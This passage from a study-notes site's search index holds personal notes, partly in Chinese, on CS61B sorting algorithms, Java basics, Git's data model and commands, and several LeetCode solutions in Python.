\u5bf9\u6570\u7ec4\u8fdb\u884c\u5206\u533a\uff0c\u5e76\u8fd4\u56de\u57fa\u51c6\u5143\u7d20\u7684\u4f4d\u7f6e\n        int pivotIndex = partition(array, low, high);\n        // \u6bd4\u8f83\u5de6\u5b50\u6570\u7ec4\u548c\u53f3\u5b50\u6570\u7ec4\u7684\u5927\u5c0f\uff0c\u4f18\u5148\u5bf9\u8f83\u5c0f\u7684\u5b50\u6570\u7ec4\u8fdb\u884c\u9012\u5f52\n        if (pivotIndex - low &lt; high - pivotIndex) {\n            // \u5982\u679c\u5de6\u5b50\u6570\u7ec4\u8f83\u5c0f\uff0c\u5148\u5bf9\u5de6\u5b50\u6570\u7ec4\u8fdb\u884c\u9012\u5f52\u6392\u5e8f\n            quicksort(array, low, pivotIndex - 1);\n            // \u66f4\u65b0 low \u7684\u503c\uff0c\u7ee7\u7eed\u5bf9\u53f3\u5b50\u6570\u7ec4\u8fdb\u884c\u6392\u5e8f\n            low = pivotIndex + 1;\n        } else {\n            // \u5982\u679c\u53f3\u5b50\u6570\u7ec4\u8f83\u5c0f\uff0c\u5148\u5bf9\u53f3\u5b50\u6570\u7ec4\u8fdb\u884c\u9012\u5f52\u6392\u5e8f\n            quicksort(array, pivotIndex + 1, high);\n            // \u66f4\u65b0 high \u7684\u503c\uff0c\u7ee7\u7eed\u5bf9\u5de6\u5b50\u6570\u7ec4\u8fdb\u884c\u6392\u5e8f\n            high = pivotIndex - 1;\n        }\n    }\n}\n</code></pre> </li> </ol> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#273_quick_select","title":"27.3 Quick Select \u5feb\u901f\u9009\u62e9","text":"<ol> <li>\u7528\u4e8e\u67e5\u627e\u6570\u7ec4\u4e2d\u7b2c k \u5c0f\u5143\u7d20\u7684\u7b97\u6cd5\uff0c\u57fa\u4e8e\u5feb\u901f\u6392\u5e8f\u7684\u5206\u533a\u601d\u60f3</li> <li> <p>\u7b97\u6cd5\uff1a</p> <ol> <li>\u9009\u62e9\u4e00\u4e2a\u57fa\u51c6\u5143\u7d20\uff0c\u5e76\u5bf9\u6570\u7ec4\u8fdb\u884c\u5206\u533a</li> <li>\u5982\u679c\u57fa\u51c6\u5143\u7d20\u7684\u4f4d\u7f6e\u7b49\u4e8ek\uff0c\u5219\u8fd4\u56de\u57fa\u51c6\u5143\u7d20</li> <li>\u5982\u679c\u57fa\u51c6\u5143\u7d20\u7684\u4f4d\u7f6e\u5927\u4e8ek\uff0c\u5219\u5728\u57fa\u51c6\u5143\u7d20\u5de6\u8fb9\u7684\u5b50\u6570\u7ec4\u4e2d\u9012\u5f52\u67e5\u627e</li> <li>\u5982\u679c\u57fa\u51c6\u5143\u7d20\u7684\u4f4d\u7f6e\u5c0f\u4e8ek\uff0c\u5219\u5728\u57fa\u51c6\u5143\u7d20\u53f3\u8fb9\u7684\u5b50\u6570\u7ec4\u4e2d\u9012\u5f52\u67e5\u627e</li> </ol> <pre><code>public static int quickSelect(int[] array, int low, int high, int k) {\n    if (low == high) {\n        return array[low];\n    }\n    int pivotIndex = partition(array, low, high);\n    if (k == pivotIndex) {\n        return array[k];\n    } else if (k &lt; pivotIndex) {\n        return quickSelect(array, low, pivotIndex - 1, k);\n    } else {\n        return quickSelect(array, pivotIndex + 1, high, k);\n    }\n}\n</code></pre> </li> <li> <p>\u5e73\u5747\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a <code>O(n)</code>\uff0c\u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a <code>O(n^2)</code></p> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec28_radix_sort","title":"Lec.28 Radix Sort \u57fa\u6570\u6392\u5e8f","text":""},{"location":"cs61b%20notes/w1dsy2ew/#281_counting_sort","title":"28.1 Counting Sort \u8ba1\u6570\u6392\u5e8f","text":"<ol> <li>\u4e00\u79cd\u975e\u6bd4\u8f83\u6392\u5e8f\u7b97\u6cd5\uff0c\u9002\u7528\u4e8e\u8303\u56f4\u8f83\u5c0f\u7684\u6574\u6570\u6392\u5e8f\uff0c\u901a\u8fc7\u8ba1\u6570\u6bcf\u4e2a\u5143\u7d20\u51fa\u73b0\u7684\u6b21\u6570\u6765\u5b9e\u73b0\u6392\u5e8f</li> <li>\u7b97\u6cd5\uff1a<ol> <li>\u627e\u5230\u6570\u7ec4\u4e2d\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\uff0c\u786e\u5b9a\u8ba1\u6570\u6570\u7ec4\u7684\u5927\u5c0f</li> <li>\u521d\u59cb\u5316\u8ba1\u6570\u6570\u7ec4\uff0c\u8bb0\u5f55\u6bcf\u4e2a\u5143\u7d20\u51fa\u73b0\u7684\u6b21\u6570</li> <li>\u8ba1\u7b97\u8ba1\u6570\u6570\u7ec4\u7684\u7d2f\u79ef\u548c\uff0c\u786e\u5b9a\u6bcf\u4e2a\u5143\u7d20\u5728\u6392\u5e8f\u540e\u6570\u7ec4\u4e2d\u7684\u4f4d\u7f6e</li> <li>\u6839\u636e\u8ba1\u6570\u6570\u7ec4\uff0c\u5c06\u5143\u7d20\u653e\u5165\u6392\u5e8f\u540e\u7684\u6570\u7ec4\u4e2d</li> </ol> </li> </ol> <pre><code>public static void countingSort(int[] array) {\n    // \u627e\u5230\u6570\u7ec4\u4e2d\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\n    int max = Arrays.stream(array).max().getAsInt();\n    int min = Arrays.stream(array).min().getAsInt();\n    // \u8ba1\u7b97\u8ba1\u6570\u6570\u7ec4\u7684\u8303\u56f4\n    int range = max - min + 1;\n    // \u521d\u59cb\u5316\u8ba1\u6570\u6570\u7ec4\u548c\u8f93\u51fa\u6570\u7ec4\n    int[] count = new int[range];\n    int[] output = new int[array.length];\n    // \u7edf\u8ba1\u6bcf\u4e2a\u5143\u7d20\u7684\u51fa\u73b0\u6b21\u6570\n    for (int num : array) {\n        count[num - min]++;\n    }\n    // \u8ba1\u7b97\u8ba1\u6570\u6570\u7ec4\u7684\u7d2f\u79ef\u548c\uff0c\u786e\u5b9a\u6bcf\u4e2a\u5143\u7d20\u5728\u6392\u5e8f\u540e\u6570\u7ec4\u4e2d\u7684\u4f4d\u7f6e\n    for (int i = 1; i &lt; count.length; i++) {\n        count[i] += count[i - 1];\n    }\n    // \u6839\u636e\u8ba1\u6570\u6570\u7ec4\uff0c\u5c06\u5143\u7d20\u653e\u5165\u6392\u5e8f\u540e\u7684\u6570\u7ec4\u4e2d\n    for (int i = array.length - 1; i &gt;= 0; i--) {\n        output[count[array[i] - min] - 1] = array[i];\n        count[array[i] - min]--;\n    }\n    // \u5c06\u6392\u5e8f\u540e\u7684\u6570\u7ec4\u590d\u5236\u56de\u539f\u6570\u7ec4\n    System.arraycopy(output, 0, array, 0, array.length);\n}\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#282_least_significant_digitlsd_radix_sort","title":"28.2 Least Significant Digit(LSD) Radix Sort","text":"<ol> <li>\u4ece\u6700\u4f4e\u6709\u6548\u4f4d\u5f00\u59cb\u6392\u5e8f\u7684\u57fa\u6570\u6392\u5e8f\u65b9\u6cd5\uff0c\u5b83\u9002\u7528\u4e8e\u56fa\u5b9a\u957f\u5ea6\u7684\u6574\u6570\u6216\u5b57\u7b26\u4e32\u6392\u5e8f</li> <li>\u7b97\u6cd5\uff1a<ul> <li>\u4ece\u6700\u4f4e\u6709\u6548\u4f4d\u5f00\u59cb\uff0c\u5bf9\u6bcf\u4e2a\u4f4d\u8fdb\u884c\u8ba1\u6570\u6392\u5e8f</li> <li>\u4f9d\u6b21\u5bf9\u6bcf\u4e2a\u4f4d\u8fdb\u884c\u6392\u5e8f\uff0c\u76f4\u5230\u6700\u9ad8\u6709\u6548\u4f4d</li> </ul> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1a<code>O(d(n+k))</code>\uff0c\u5176\u4e2d<code>d</code>\u662f\u6570\u5b57\u7684\u4f4d\u6570\uff0c<code>k</code>\u662f\u6bcf\u4e2a\u4f4d\u7684\u53ef\u80fd\u53d6\u503c\u8303\u56f4</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec29_just-in-time_compiler","title":"Lec.29 \u5373\u65f6\u7f16\u8bd1\u5668\uff08Just-In-Time Compiler\uff09","text":"<ol> <li>\u5b9a\u4e49:\u5373\u65f6\u7f16\u8bd1\u5668 <code>JIT Compiler</code> \u662f\u4e00\u79cd\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u5c06\u5b57\u8282\u7801\u7f16\u8bd1\u4e3a\u673a\u5668\u7801\u7684\u7f16\u8bd1\u5668\u3002<code>JIT</code> \u7f16\u8bd1\u5668\u662f <code>Java</code> \u865a\u62df\u673a <code>JVM</code> \u7684\u4e00\u90e8\u5206\uff0c\u7528\u4e8e\u63d0\u9ad8 <code>Java</code> \u7a0b\u5e8f\u7684\u6267\u884c\u6548\u7387\u3002</li> <li>\u5de5\u4f5c\u539f\u7406<ul> <li>\u5b57\u8282\u7801\u89e3\u91ca\uff1a<code>JVM</code> \u9996\u5148\u89e3\u91ca\u6267\u884c\u5b57\u8282\u7801</li> <li>\u70ed\u70b9\u4ee3\u7801\u68c0\u6d4b\uff1a<code>JIT</code> \u7f16\u8bd1\u5668\u68c0\u6d4b\u5230\u70ed\u70b9\u4ee3\u7801\uff08\u9891\u7e41\u6267\u884c\u7684\u4ee3\u7801\uff09</li> <li>\u7f16\u8bd1\u4f18\u5316\uff1a<code>JIT</code> \u7f16\u8bd1\u5668\u5c06\u70ed\u70b9\u4ee3\u7801\u7f16\u8bd1\u4e3a\u673a\u5668\u7801\uff0c\u5e76\u8fdb\u884c\u4f18\u5316</li> <li>\u673a\u5668\u7801\u6267\u884c\uff1a<code>JVM</code> \u6267\u884c\u7f16\u8bd1\u540e\u7684\u673a\u5668\u7801\uff0c\u63d0\u9ad8\u7a0b\u5e8f\u7684\u6267\u884c\u6548\u7387</li> </ul> </li> <li>\u4f18\u70b9<ul> <li>\u6027\u80fd\u63d0\u5347\uff1a\u901a\u8fc7\u5c06\u70ed\u70b9\u4ee3\u7801\u7f16\u8bd1\u4e3a\u673a\u5668\u7801\uff0c<code>JIT</code> \u7f16\u8bd1\u5668\u53ef\u4ee5\u663e\u8457\u63d0\u9ad8\u7a0b\u5e8f\u7684\u6267\u884c\u6548\u7387</li> <li>\u52a8\u6001\u4f18\u5316\uff1a<code>JIT</code> \u7f16\u8bd1\u5668\u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u8fdb\u884c\u4f18\u5316\uff0c\u5229\u7528\u8fd0\u884c\u65f6\u4fe1\u606f\u8fdb\u884c\u66f4\u6709\u6548\u7684\u4f18\u5316</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u542f\u52a8\u65f6\u95f4\uff1a<code>JIT</code> \u7f16\u8bd1\u5668\u5728\u7a0b\u5e8f\u542f\u52a8\u65f6\u9700\u8981\u989d\u5916\u7684\u65f6\u95f4\u8fdb\u884c\u7f16\u8bd1\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u542f\u52a8\u65f6\u95f4\u53d8\u957f</li> <li>\u5185\u5b58\u5360\u7528\uff1a\u7f16\u8bd1\u540e\u7684\u673a\u5668\u7801\u9700\u8981\u989d\u5916\u7684\u5185\u5b58\u7a7a\u95f4</li> </ul> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec30_compression_complexity_p_np","title":"Lec.30 Compression, Complexity, P = NP","text":"<ol> <li>\u538b\u7f29\u6a21\u578b<ul> <li>\u7edf\u8ba1\u6a21\u578b\uff1a\u57fa\u4e8e\u6570\u636e\u7684\u7edf\u8ba1\u7279\u6027\u8fdb\u884c\u538b\u7f29</li> <li>\u5b57\u5178\u6a21\u578b\uff1a\u57fa\u4e8e\u91cd\u590d\u6a21\u5f0f\u8fdb\u884c\u538b\u7f29</li> <li>\u53d8\u6362\u6a21\u578b\uff1a\u901a\u8fc7\u53d8\u6362\u6570\u636e\u8868\u793a\u5f62\u5f0f\u8fdb\u884c\u538b\u7f29</li> </ul> </li> <li><code>Kolmogorov</code>\u590d\u6742\u6027<ul> <li>\u5b9a\u4e49\uff1a\u63cf\u8ff0\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u6700\u77ed\u7a0b\u5e8f\u957f\u5ea6</li> <li>\u6700\u4f18\u538b\u7f29\uff1a\u5c06\u6570\u636e\u538b\u7f29\u5230\u5176Kolmogorov\u590d\u6742\u6027\u6240\u8868\u793a\u7684\u6700\u5c0f\u957f\u5ea6</li> </ul> </li> <li>\u7a7a\u95f4\u65f6\u95f4\u6709\u754c\u538b\u7f29<ul> <li>\u7a7a\u95f4\u6709\u754c\u538b\u7f29\uff1a\u5728\u6709\u9650\u7684\u5b58\u50a8\u7a7a\u95f4\u5185\u8fdb\u884c\u6570\u636e\u538b\u7f29</li> <li>\u65f6\u95f4\u6709\u754c\u538b\u7f29\uff1a\u5728\u6709\u9650\u7684\u65f6\u95f4\u5185\u8fdb\u884c\u6570\u636e\u538b\u7f29</li> <li>\u5e73\u8861\u7a7a\u95f4\u548c\u65f6\u95f4\uff1a\u5728\u538b\u7f29\u6548\u7387\u3001\u538b\u7f29\u901f\u5ea6\u548c\u5b58\u50a8\u7a7a\u95f4\u4e4b\u95f4\u8fdb\u884c\u6743\u8861</li> </ul> </li> <li><code>P</code>\u4e0e<code>NP</code><ul> <li><code>P</code>\u7c7b\u95ee\u9898\uff1a\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u7531\u786e\u5b9a\u6027\u56fe\u7075\u673a\u89e3\u51b3\u7684\u95ee\u9898</li> <li><code>NP</code>\u7c7b\u95ee\u9898\uff1a\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u7531\u975e\u786e\u5b9a\u6027\u56fe\u7075\u673a\u9a8c\u8bc1\u7684\u95ee\u9898</li> <li><code>P</code>\u4e0e<code>NP</code>\u95ee\u9898\uff1a\u8be2\u95ee<code>P</code>\u7c7b\u95ee\u9898\u662f\u5426\u7b49\u4e8e<code>NP</code>\u7c7b\u95ee\u9898\uff0c\u5373\u6240\u6709\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u9a8c\u8bc1\u7684\u95ee\u9898\u662f\u5426\u4e5f\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u89e3\u51b3</li> <li><code>NP</code>\u5b8c\u5168\u95ee\u9898\uff1a<code>NP</code>\u7c7b\u95ee\u9898\u4e2d\u7684\u4e00\u7c7b\u6700\u96be\u95ee\u9898\uff0c\u5982\u679c\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u89e3\u51b3\u4e00\u4e2a<code>NP</code>\u5b8c\u5168\u95ee\u9898\uff0c\u90a3\u4e48\u6240\u6709<code>NP</code>\u7c7b\u95ee\u9898\u90fd\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u89e3\u51b3</li> </ul> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#cs61b_done","title":"CS61B Done :)","text":""},{"location":"cs61b%20notes/waiting/","title":"Waiting","text":""},{"location":"cs61b%20notes/waiting/#exponential","title":"EXponential","text":"<p><pre><code>Math.pow(a, b)\n</code></pre> Note that <code>^</code> in Java is the \u201cXOR\u201d operator, not the exponentiation operation. That is, 2 ^ 10 is valid code, but it will return 8, not 1024.</p>"},{"location":"cs61b%20notes/waiting/#type_casting","title":"type casting","text":"<pre><code>String str = \"123\";\nint number = Integer.parseInt(str);\n</code></pre>"},{"location":"cs61b%20notes/waiting/#foreach_loop_enhanced_for_loop","title":"Foreach Loop / Enhanced For Loop","text":"<p>used in array &amp; list <pre><code>int[] array = {1, 2, 3};\nfor (int i : array) {\n    System.out.println(i);\n}\n</code></pre></p> <p>To print an array, you can call Arrays.toString(array). Arrays do not have a length method. It is an instance variable, so it does not have parentheses. Java does not support negative indexing or slicing.</p>"},{"location":"cs61b%20notes/waiting/#strings","title":"Strings","text":"<p><pre><code>String s = \"hello\";\ns += \" world\";\ns += 5;\nint sLength = s.length();\nString substr = s.substring(1, 5);\nchar c = s.charAt(2);\nif (s.indexOf(\"hello\") != -1) {\n    System.out.println(\"\\\"hello\\\" in s\");\n}\nfor (int i = 0; i &lt; s.length(); i++) {\n    char letter = s.charAt(i);\n    System.out.println(letter);\n}\n</code></pre> Strings are not directly iterable.  - iterate over an index and use <code>charAt</code> - convert it to an array.</p> <p>you can add anything to a Strings, and it will be implicitly converted to a String without needing to explicitly cast.</p>"},{"location":"cs61b%20notes/waiting/#lists","title":"Lists","text":"<pre><code>List&lt;String&gt; lst = new ArrayList&lt;&gt;();\nlst.add(\"zero\");\nlst.add(\"one\");\nlst.set(0, \"zed\");\nSystem.out.println(lst.get(0));\nSystem.out.println(lst.size());\nif (lst.contains(\"one\")) {\n    System.out.println(\"one in lst\");\n}\nfor (String elem : lst) {\n    System.out.println(elem);\n}\n</code></pre>"},{"location":"cs61b%20notes/waiting/#set_map","title":"Set &amp; Map","text":"<p>Red black tree based approach: TreeSet/TreeMap. - Requires items to be comparable. - Logarithmic time operations.</p> <p>Hash table based approach: HashSet/HashMap. - Constant time operations if the hashCode spreads the items out nicely.</p>"},{"location":"cs61b%20notes/waiting/#set","title":"Set","text":"<p><pre><code>Set&lt;Integer&gt; set = new HashSet&lt;&gt;();\nset.add(1);\nset.add(1);\nset.add(2);\nset.remove(2);\nSystem.out.println(set.size());\nif (set.contains(1)) {\n    System.out.println(\"1 in set\");\n}\nfor (int elem : set) {\n    System.out.println(elem);\n}\n</code></pre> There are two main implementations: TreeSet, and HashSet. TreeSet keeps its elements in \u201csorted\u201d order, and is fast. In contrast, HashSet does not have a defined \u201corder\u201d, but is (usually) really fast.</p>"},{"location":"cs61b%20notes/waiting/#map","title":"Map","text":"<p><pre><code>Map&lt;String, String&gt; map = new HashMap&lt;&gt;();\nmap.put(\"hello\", \"hi\");\nmap.put(\"hello\", \"goodbye\");\nSystem.out.println(map.get(\"hello\"));\nSystem.out.println(map.size());\nif (map.containsKey(\"hello\")) {\n    System.out.println(\"\\\"hello\\\" in map\");\n}\nfor (String key : map.keySet()) {\n    System.out.println(key);\n}\n</code></pre> Java has the Map interface. There are two main implementations: <code>TreeMap</code>, and <code>HashMap</code>. Similarly to sets, TreeMap keeps its keys sorted and is fast; HashMap has no defined order and is (usually) really fast. A Map cannot contain duplicate keys. If we try to add a key already in the map, the value is overwritten. In the angle brackets, we have the \u201ckey type\u201d first, followed by the \u201cvalue type\u201d. Maps cannot directly be used with the : for loop. Typically, we call <code>keySet</code> to iterate over a set of the keys, and use those to retrieve the values. One may also iterate over the entrySet to get both the keys and values.</p> <p>\u5728 Java \u4e2d\uff0cMap\u7684 get(key)\u65b9\u6cd5\u5728\u952e\uff08key\uff09\u4e0d\u5b58\u5728\u65f6\u4f1a\u8fd4\u56de null\uff0c\u800c\u200b\u200b\u4e0d\u4f1a\u629b\u51fa\u5f02\u5e38\u200b\u200b</p>"},{"location":"cs61b%20notes/waiting/#exception","title":"Exception","text":"<pre><code>public static int minIndex(int[] numbers) {\n    if (numbers.length == 0) {\n        throw new Exception(\"There are no elements in the array!\");\n    }\n    int m = numbers[0];\n    int idx = 0;\n\n    ...\n\n    return m;\n}\n</code></pre>"},{"location":"cs61b%20notes/waiting/#return_switch","title":"return switch","text":"<pre><code>public static String[] takeOrder(String customer) {\n        return switch (customer) {\n            case \"Ergun\" -&gt; new String[]{\"beyti\", \"pizza\", \"hamburger\", \"tea\"};\n            case \"Eric\" -&gt; new String[]{\"sushi\", \"pasta\", \"avocado\", \"coffee\"};\n            default -&gt; new String[3];\n        };\n    }\n</code></pre>"},{"location":"cs61b%20notes/waiting/#boolean","title":"boolean","text":"<p>Java \u4e2d\u975e null\u7684\u5f15\u7528\u7c7b\u578b \u200b\u200b\u6ca1\u6709\u9ed8\u8ba4\u5e03\u5c14\u503c\u200b\u200b\uff0c\u5fc5\u987b\u901a\u8fc7\u663e\u5f0f\u6761\u4ef6\uff08\u5982 != null\uff09\u6216\u81ea\u5b9a\u4e49\u65b9\u6cd5\u8f6c\u6362\u4e3a\u5e03\u5c14\u7ed3\u679c\u3002</p>"},{"location":"cs61b%20notes/waiting/#general_type_parameter_var_args","title":"general type parameter, var args","text":"<p><pre><code>public static &lt;T&gt; \u8fd4\u56de\u503c\u7c7b\u578b \u65b9\u6cd5\u540d(T... parameters) { ... }\n</code></pre> <pre><code>public static &lt;Glerp&gt; ArraySet&lt;Glerp&gt; of(Glerp... stuff) {\n   ArraySet&lt;Glerp&gt; returnSet = new ArraySet&lt;Glerp&gt;();\n   for (Glerp x : stuff) {\n       returnSet.add(x);\n   }\n   return returnSet;\n}\n</code></pre></p>"},{"location":"cs61b%20notes/waiting/#mutable_vs_immutable_types","title":"Mutable vs. Immutable Types","text":"<p>An immutable data type is one for which an instance cannot change in any observable way after instantiation.</p> <p><code>final</code> variable means you may assign a value once (either in constructor of class or in initializer), but after it can never change</p> <p><pre><code>public class Rock {\n  public final int weight;\n  public Rock (int w) { \n    weight = w; \n  }\n}\n</code></pre> <pre><code>public class RocksBox {\n  public final Rock[] rocks;\n  public RocksBox (Rock[] rox) {\n    rocks = rox; \n  }\n}\n</code></pre> <pre><code>public class SecretRocksBox {\n  private Rock[] rocks;\n  public SecretRocksBox(Rock[] rox) {\n    rocks = rox; \n  }\n}\n</code></pre> mutable: <pre><code>Rock r1 = new Rock(10);\nRock r2 = new Rock(20);\nRock[] rox = {r1, r2};\nSecretRocksBox rb = new SecretRocksBox(rox);\nrox[0] = new Rock(-999);\n</code></pre></p>"},{"location":"cs61b%20notes/waiting/#variable_arguments_varargs","title":"Variable Arguments / Varargs","text":"<pre><code>public void printValues(String... values) {\n    for (String val : values) {\n        System.out.println(val);\n    }\n}\n</code></pre>"},{"location":"cs61b%20notes/waiting/#timestamp_time","title":"timestamp &amp; time","text":"<pre><code>import java.util.Date;\n\nDate now = new Date(); // \u81ea\u52a8\u8bbe\u7f6e\u4e3a\u5f53\u524d\u65f6\u95f4\nSystem.out.println(now); // Fri Jan 06 14:30:45 CST 2023\n\n// \u6307\u5b9a\u65f6\u95f4\u6233\u521b\u5efa, \u65f6\u95f4\u6233 \u2192 \u65e5\u671f\nDate specificDate = new Date(1650000000000L);\n\n// \u65e5\u671f \u2192 \u65f6\u95f4\u6233\nlong timestamp = new Date().getTime();\n</code></pre>"},{"location":"cs61b%20notes/waiting/#substring","title":"substring","text":"<p><pre><code>public String substring(int beginIndex)\n</code></pre> <pre><code>public String substring(int beginIndex, int endIndex)\n</code></pre> The substring begins at the specified beginIndex and extends to the character at index endIndex - 1.</p>"},{"location":"git/git/","title":"Git","text":""},{"location":"git/git/#version_control","title":"Version Control","text":""},{"location":"git/git/#gits_data_model","title":"Git's data model <p>A file is called a \"blob\", and it's just a bunch of bytes. A directory is called a \"tree\", and it maps names to blobs or trees. A snapshot is the top-level tree that is being tracked. A commit is a combination of log messages, other metadata (commit date, author, etc.), a reference to a tree, and references to parent commits. </p> <pre><code>// a file is a bunch of bytes\ntype blob = array&lt;byte&gt;\n\n// a directory contains named files and directories\ntype tree = map&lt;string, tree | blob&gt;\n\n// a commit has parents, metadata, and the top-level tree\ntype commit = struct {\n    parents: array&lt;commit&gt;\n    author: string\n    message: string\n    snapshot: tree\n}\n</code></pre>","text":""},{"location":"git/git/#modeling_history_relating_snapshots","title":"Modeling history: relating snapshots","text":"<pre><code>o &lt;-- o &lt;-- o &lt;-- o &lt;---- o\n            ^            /\n             \\          v\n              --- o &lt;-- o\n</code></pre>"},{"location":"git/git/#objects_and_content-addressing","title":"Objects and content-addressing","text":"<p><pre><code>type object = blob | tree | commit\n</code></pre> In Git data store, all objects are content-addressed by their SHA-1 hash. <pre><code>objects = map&lt;string, object&gt;\n\ndef store(object):\n    id = sha1(object)\n    objects[id] = object\n\ndef load(id):\n    return objects[id]\n</code></pre> e.g. the tree above: <pre><code>git cat-file -p 698281bc680d1995c5f4caaf3359721a5a58d48d\n\n    100644 blob 4448adbf7ecd394f42ae135bbeed9676e894af85    baz.txt\n    040000 tree c68d233a33c5c06e0340e4c224f0afca87c8ce87    foo\n\ngit cat-file -p 4448adbf7ecd394f42ae135bbeed9676e894af85\n\n    git is wonderful\n</code></pre></p>"},{"location":"git/git/#references","title":"References","text":"<p>References are pointers to commits. <pre><code>references = map&lt;string, string&gt;\n\ndef update_reference(name, id):\n    references[name] = id\n\ndef read_reference(name):\n    return references[name]\n\ndef load_reference(name_or_id):\n    if name_or_id in references:\n        return load(references[name_or_id])\n    else:\n        return load(name_or_id)\n</code></pre></p>"},{"location":"git/git/#branch","title":"Branch <p>https://learngitbranching.js.org/?locale=zh_CN</p> <ul> <li><code>git branch</code>: shows branches</li> <li><code>git branch &lt;name&gt;</code>: creates a branch</li> <li><code>git checkout -b &lt;name&gt;</code>: creates a branch and switches to it<ul> <li>same as <code>git branch &lt;name&gt;; git checkout &lt;name&gt;</code></li> </ul> </li> <li><code>git merge &lt;revision&gt;</code>: merges into current branch Fast forwarding   merge 2 'branches'  </li> <li><code>git mergetool</code>: use a fancy tool to help resolve merge conflicts</li> <li><code>git rebase</code>: rebase set of patches onto a new base</li> </ul>","text":""},{"location":"git/git/#remote","title":"Remote <ul> <li><code>git remote</code>: list remotes</li> <li><code>git remote add &lt;name&gt; &lt;url&gt;</code>: add a remote</li> <li><code>git push &lt;remote&gt; &lt;local branch&gt;:&lt;remote branch&gt;</code>: send objects to remote, and update remote reference</li> <li><code>git branch --set-upstream-to=&lt;remote&gt;/&lt;remote branch&gt;</code>: set up correspondence between local and remote branch</li> <li><code>git fetch</code>: retrieve objects/references from a remote</li> <li><code>git pull</code>: same as <code>git fetch; git merge</code></li> <li><code>git clone</code>: download repository from remote</li> </ul>","text":""},{"location":"leetcode/leetcode/","title":"Leetcode","text":""},{"location":"leetcode/leetcode/#twosum","title":"twoSum","text":"<p>\u00d7 iterate the whole list for every num \u221a hash <pre><code>class Solution:\n    def twoSum(self, nums, target):\n        ht = {}     # initiallize!!!\n        for i, num in enumerate(nums): \n            if num in ht:\n                return [i, ht[num]]\n            ht[target - num] = i \n</code></pre></p>"},{"location":"leetcode/leetcode/#addtwonumbers","title":"addTwoNumbers","text":"<p>LinkList -&gt; dummy head!!! <pre><code># Definition for singly-linked list.\n# class ListNode(object):\n#     def __init__(self, val=0, next=None):\n#         self.val = val\n#         self.next = next\nclass Solution(object):\n    def addTwoNumbers(self, l1, l2):\n        \"\"\"\n        :type l1: Optional[ListNode]\n        :type l2: Optional[ListNode]\n        :rtype: Optional[ListNode]\n        \"\"\"\n        co = 0\n        res = ListNode()\n        cur = res\n        while l1 != None or l2 != None:\n            cur.next = ListNode()\n            cur = cur.next\n            s = co\n            if l1:\n                s += l1.val\n                l1 = l1.next\n            if l2:\n                s += l2.val\n                l2 = l2.next\n\n            if s &gt;= 10:\n                co = 1\n                cur.val = s - 10\n            else:\n                co = 0\n                cur.val = s\n\n        if co == 1:\n            cur.next = ListNode(1, None)\n        return res.next \n</code></pre></p>"},{"location":"leetcode/leetcode/#lengthoflongestindex","title":"lengthOfLongestIndex","text":"cases expected remark \"abac\" 3 \u5f53\u51fa\u73b0\u91cd\u590d\u5b57\u7b26\u65f6\uff0c\u5e94\u5f53\u4ece\u4e0a\u4e00\u51fa\u73b0\u4f4d\u7f6e\u7684\u4e0b\u4e00\u4e2a\u5f00\u59cb\u91cd\u65b0\u8ba1\u7b97\uff0c\u800c\u4e0d\u662f\u7b2c\u4e8c\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e \" \" 1 \u4e0d\u80fd\u7b49\u51fa\u73b0\u91cd\u590d\u4e86\u624d\u7edf\u8ba1\u5b57\u7b26 <p><pre><code>class Solution(object):\n    def lengthOfLongestSubstring(self, s):\n        \"\"\"\n        :type s: str\n        :rtype: int\n        \"\"\"\n        char_index = {}\n        max_len = 0\n        left = 0\n\n        for right, char in enumerate(s):\n            if char in char_index and char_index[char] &gt;= left:\n                left = char_index[char] + 1\n            char_index[char] = right\n            max_len = max(max_len, right - left + 1)\n\n        return max_len\n</code></pre> substring: - left &amp; right + char_index \u221a     <pre><code>if char in char_index and char_index[char] &gt;= left: \n    left = char_index[char] + 1     # O(N)\n    ...\n</code></pre> - substr[] \u00d7     <pre><code>if cur_char in substr:  \n    pos = substr.index()    # O(N^2)\n    substr = substr[pos + 1:] + [letter]    \n...\n</code></pre></p> <p>max_len: - max_len \u221a - max(possible_max_lens) \u00d7</p>"},{"location":"leetcode/leetcode/#longestpalindrome","title":"longestPalindrome","text":"<p>2 simplest cases: - even length: \"aa\" - odd length: \"a\"</p> <p>then try to extend them  <pre><code>class Solution(object):\n    def longestPalindrome(self, s):\n        \"\"\"\n        :type s: str\n        :rtype: str\n        \"\"\"\n        max_len = 0\n        max_str = []\n        for cur in range(len(s)):\n            right = cur\n            left = right - 1\n            while left &gt;= 0 and right &lt; len(s) and s[left] == s[right]:\n                left -= 1\n                right += 1\n            if left &gt;= -1 and right - left - 1 &gt; max_len:\n                max_len = right - left - 1\n                max_str = s[left + 1 : right]\n\n            right = cur\n            left = right \n            while left &gt;= 0 and right &lt; len(s) and s[left] == s[right]:\n                left -= 1\n                right += 1\n            if left &gt;= -1 and right - left - 1 &gt; max_len:\n                max_len = right - left - 1\n                max_str = s[left + 1 : right]\n\n        return \"\".join(max_str)\n</code></pre> \u26a0\ufe0floop variable cannot be reassigned within the loop  <pre><code>for right in range(len(s)):\n    ...\n    right += 1\n    